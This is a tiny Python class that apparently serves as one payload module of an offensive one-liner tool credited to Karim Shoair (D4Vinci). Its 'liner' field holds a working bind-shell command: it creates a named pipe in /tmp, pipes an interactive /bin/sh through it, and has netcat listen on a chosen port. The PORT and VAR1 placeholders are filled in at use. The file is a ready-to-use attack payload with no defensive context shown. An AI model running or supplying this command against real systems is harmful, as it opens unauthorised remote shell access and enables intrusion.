class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses netcat and mkfifo to setup a bind shell"
    function    = "bind shell"
    liner       = """rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/VAR1"""
